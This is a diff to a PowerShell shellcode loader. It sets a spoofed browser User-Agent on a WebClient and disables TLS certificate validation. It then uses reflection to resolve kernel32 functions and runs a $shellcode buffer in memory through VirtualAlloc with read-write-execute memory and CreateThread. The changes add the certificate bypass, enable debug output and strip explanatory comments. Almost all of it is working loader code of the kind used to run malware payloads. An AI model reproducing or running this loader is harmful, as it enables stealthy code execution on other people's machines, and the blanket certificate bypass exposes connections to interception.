@@ -1,5 +1,8 @@
 # 1. Security & Protocol Setup
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+# Essential for bypassing SSL/TLS errors from your previous attempts
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
+[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+
 $wc = New-Object Net.WebClient
 $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.3719.104")
 
@@ -57,7 +60,6 @@ if (-not ([System.Management.Automation.PSTypeName]"kernel32").Type) {
 }
 
 
-# Look for system.dll and find GetProcAddress()
 function LookupFunc {
     Param ($moduleName, $functionName)
 
@@ -66,12 +68,10 @@ function LookupFunc {
     $handle = $assem.GetMethod('GetModuleHandle').Invoke($null, @($moduleName));
     [IntPtr] $result = 0;
     try {
-        #  @dev Uncomment the line below for debugging.
-        # Write-Host "First Invoke - $moduleName $functionName";
+        Write-Host "First Invoke - $moduleName $functionName";
         $result = $tmp[0].Invoke($null, @($handle, $functionName));
     }catch {
-        #  @dev Uncomment the line below for debugging.
-        # Write-Host "Second Invoke - $moduleName $functionName";
+        Write-Host "Second Invoke - $moduleName $functionName";
         $handle = new-object -TypeName System.Runtime.InteropServices.HandleRef -ArgumentList @($null, $handle);
         $result = $tmp[0].Invoke($null, @($handle, $functionName));
     }
@@ -85,8 +85,6 @@ function getDelegateType {
     $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
     return $type.CreateType() 
 }
-
-# Shellcode Execution via VirtualAlloc()
 $lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc),(getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)
 [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $lpMem, $shellcode.Length)
 $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread),(getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
